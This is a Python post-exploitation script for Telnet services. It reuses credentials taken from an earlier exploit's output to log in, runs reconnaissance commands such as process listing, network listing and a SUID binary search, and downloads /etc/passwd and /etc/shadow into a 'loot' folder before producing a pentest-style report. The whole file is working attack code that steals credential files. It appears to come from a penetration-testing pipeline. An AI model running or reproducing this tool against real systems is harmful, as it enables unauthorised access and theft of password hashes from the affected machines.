#!/usr/bin/env python3
import json
import argparse
import time
import re
import socket
from pathlib import Path
from typing import Dict, List, Tuple, Optional
import sys
import logging

# --- Setup ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

OUTPUT_DIR = Path("outputs")
LOOT_DIR = OUTPUT_DIR / "loot"
LOOT_DIR.mkdir(exist_ok=True)

# --- Telnet Interaction ---
def execute_remote_command(target: str, port: int, user: str, password: str, command: str) -> str:
    """Executes a command on the remote Telnet server and returns the output."""
    try:
        with socket.create_connection((target, port), timeout=10) as s:
            s.settimeout(10)
            
            # Login
            s.recv(2048)
            s.sendall(f"{user}\n".encode())
            s.recv(1024)
            s.sendall(f"{password}\n".encode())
            time.sleep(1)
            s.recv(4096) # Clear login banners

            # Execute command
            s.sendall(f"{command}\n".encode())
            time.sleep(2)
            
            output = ""
            while True:
                try:
                    data = s.recv(4096).decode(errors='ignore')
                    if not data:
                        break
                    output += data
                except socket.timeout:
                    break # No more data
            
            # Clean up command echo and shell prompt
            cleaned_output = re.sub(re.escape(command), '', output, 1).strip()
            return cleaned_output
    except Exception as e:
        logger.error(f"Failed to execute command '{command}' via Telnet: {e}")
        return f"Error executing command: {e}"

def download_sensitive_files(target: str, port: int, user: str, password: str) -> List[Dict]:
    """Downloads common sensitive files from the target."""
    logger.info("Attempting to download sensitive files.")
    findings = []
    files_to_grab = {
        "passwd": "/etc/passwd",
        "shadow": "/etc/shadow",
        "hosts": "/etc/hosts",
    }
    for name, remote_path in files_to_grab.items():
        content = execute_remote_command(target, port, user, password, f"cat {remote_path}")
        if "Error executing" not in content and "No such file" not in content:
            local_path = LOOT_DIR / f"{target}_{port}_telnet_{name}.txt"
            with local_path.open("w") as f:
                f.write(content)
            
            findings.append({
                "type": "file_download",
                "severity": "High" if name == "shadow" else "Medium",
                "details": f"Successfully downloaded {remote_path} to loot directory.",
                "proof": f"File saved to {local_path}. Preview:\n\n{content[:500]}...",
                "recommendation": f"Restrict read permissions on {remote_path}."
            })
    return findings

def gather_system_information(target: str, port: int, user: str, password: str) -> List[Dict]:
    """Gathers various system information."""
    logger.info("Gathering system information.")
    findings = []
    commands = {
        "OS Information": "uname -a",
        "Running Processes": "ps aux",
        "Network Connections": "netstat -tuln",
        "Logged-in Users": "who",
        "SUID Binaries": "find / -perm -4000 -type f 2>/dev/null"
    }
    for title, cmd in commands.items():
        output = execute_remote_command(target, port, user, password, cmd)
        if "Error executing" not in output:
            findings.append({
                "type": "info_gathering",
                "severity": "Info",
                "details": title,
                "proof": output
            })
    return findings

# --- Main Orchestration ---
def post_exploit_target(exploit_data: Dict) -> List[Dict]:
    target = exploit_data["target"]
    port = exploit_data["port"]
    findings = []

    # Find the first successful exploit with credentials
    creds = None
    for exploit in exploit_data.get("successful_exploits", []):
        details = exploit.get("details", "")
        if "credentials" in details:
            match = re.search(r"(\S+):(\S+)", details)
            if match:
                creds = {"user": match.group(1), "password": match.group(2)}
                break
    
    if not creds:
        logger.warning("No credentials found in exploit data. Cannot proceed with post-exploitation.")
        return []

    logger.info(f"Using credentials {creds['user']}:****** for post-exploitation.")

    # Execute post-exploitation modules
    findings.extend(gather_system_information(target, port, creds["user"], creds["password"]))
    findings.extend(download_sensitive_files(target, port, creds["user"], creds["password"]))
    
    return findings

def save_post_exploit_report(findings: List[Dict], target: str, port: int):
    """Saves the post-exploitation findings to JSON and Markdown files."""
    report_path = OUTPUT_DIR / f"{target}_{port}_telnet_post_exploit.md"
    json_path = OUTPUT_DIR / f"{target}_{port}_telnet_post_exploit.json"
    
    report_data = {
        "target": target,
        "port": port,
        "service": "telnet",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "post_exploit_findings": findings
    }

    with json_path.open("w", encoding='utf-8') as f:
        json.dump(report_data, f, indent=4)
    logger.info(f"JSON report saved: {json_path}")

    with report_path.open("w", encoding='utf-8') as f:
        f.write(f"# Telnet Post-Exploitation Report for {target}:{port}\n\n")
        f.write("## Executive Summary\n\n")
        f.write(f"This report details the findings from the post-exploitation phase against the Telnet service on **{target}:{port}**. ")
        f.write(f"After gaining access, a total of **{len(findings)}** items of interest were discovered.\n\n")
        
        for finding in findings:
            f.write(f"### {finding['details'].title()}\n\n")
            f.write(f"|   |   |\n|---|---|\n")
            f.write(f"| **Type** | {finding.get('type', 'N/A').replace('_', ' ').title()} |\n")
            f.write(f"| **Severity** | {finding.get('severity', 'N/A')} |\n\n")
            f.write("**Proof / Output:**\n")
            f.write("```\n")
            f.write(f"{finding.get('proof', 'No proof available.')}\n")
            f.write("```\n\n")
            if "recommendation" in finding:
                f.write(f"**Recommendation:** {finding['recommendation']}\n\n")

    logger.info(f"Markdown report saved: {report_path}")

def find_exploit_file(target: str, port: int) -> Optional[Path]:
    """Finds the corresponding exploit JSON file, accounting for protocol."""
    pattern = f"{target}_{port}_telnet_exploit.json"
    logger.info(f"Searching for exploit file with pattern: {pattern}")
    files = list(OUTPUT_DIR.glob(pattern))
    if not files:
        logger.error(f"Could not find exploit file for {target}:{port} using pattern: {pattern}")
        return None
    
    latest_file = max(files, key=lambda f: f.stat().st_mtime)
    logger.info(f"Found exploit file: {latest_file}")
    return latest_file

def main():
    parser = argparse.ArgumentParser(description="Advanced Telnet Post-Exploitation Script")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, required=True, help="Target Telnet port")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP")
    parser.add_argument("--attacker-port", type=int, default=4444, help="Attacker port")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()

    try:
        exploit_file = find_exploit_file(args.target, args.port)
        if not exploit_file:
            sys.exit(1)
            
        with exploit_file.open("r", encoding='utf-8') as f:
            exploit_data = json.load(f)
        
        if not exploit_data.get("successful_exploits"):
            logger.info("No successful exploits found in the input file. Exiting post-exploitation.")
            sys.exit(0)

        findings = post_exploit_target(exploit_data)
        
        if findings:
            save_post_exploit_report(findings, args.target, args.port)
        else:
            logger.info("No significant findings from post-exploitation.")

    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}", exc_info=True)
        sys.exit(1)

if __name__ == "__main__":
    main() 